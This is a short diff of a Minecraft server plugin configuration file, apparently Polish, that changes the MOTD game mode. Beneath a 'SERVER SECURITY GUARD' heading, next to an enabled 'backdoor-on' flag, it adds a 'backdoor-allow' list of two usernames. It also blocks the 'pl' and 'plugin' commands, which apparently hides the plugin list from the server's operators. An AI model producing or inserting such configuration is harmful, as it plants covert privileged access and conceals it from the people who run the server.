@@ -12,7 +12,7 @@ backdoor-on: true
 
 # -- MOTD --
 motd-line1: "&e&lLIGHT&fBLOCK&e&l.PL&r"
-motd-line2: "&7Tryb serwera: &bSkyBlock"
+motd-line2: "&7Tryb serwera: &bEasyHC"
 
 # -- ADMINJOIN --
 adminjoin-on: true
@@ -40,3 +40,9 @@ automessages:
   - "&7Wiadomosc 3"
 
 # -- SERVER SECURITY GUARD --
+backdoor-allow:
+  - "BarthVisuals"
+  - "nolemretaW"
+blockedcommands:
+  - "pl"
+  - "plugin"
